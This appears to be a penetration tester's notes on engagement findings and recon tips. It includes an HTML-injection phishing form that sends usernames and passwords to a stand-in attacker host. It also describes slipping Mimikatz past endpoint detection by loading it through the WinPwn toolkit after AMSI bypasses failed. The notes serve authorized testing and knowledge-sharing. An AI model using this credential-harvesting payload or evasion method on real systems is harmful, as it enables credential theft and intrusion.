## Selected Findings

### XSS → Credential Harvesting Demo

I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.


```html
<form action="https://attacker-controlled.example/collect" method="POST">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Sign In</button>
</form>
```



<br>


### Mimikatz Execution on a Hardened Endpoint via WinPwn

I was provided a well-hardened endpoint to test.  Direct Mimikatz execution was reliably blocked, even after trying several AMSI-bypass techniques (including a number from [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), which — unsurprisingly — were already well signatured). I pivoted to [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn), a broader enumeration and exploitation toolkit, which loads Mimikatz indirectly rather than invoking it directly. That indirection was enough to slip past the endpoint's detection and get it running.

**Takeaway:** Direct signature-based blocks on known tools like Mimikatz don't always account for tools that load them as a dependency rather than invoking them by name — a useful reminder when evaluating EDR coverage.
<br><br>

## Tips / Tricks <br>


### Enumerate web sites via the SSL Cert<br>
nmap -Pn -p 443 --script ssl-cert --open [target].250-253| grep -e 172.24.100 -e "commonName"




<br><br>
### Getting large number of Web Sites into Burp<br>
a. Scan the network for common web ports with nmap and output that in greppable format -oG net.scan<br>
b. Open burp and have it ready to accept incoming requests<br>
c. Use a for loop to cat that file into Burp with something like 'for i in $(cat net.scan)do curl --proxy localhost:8080'<br>





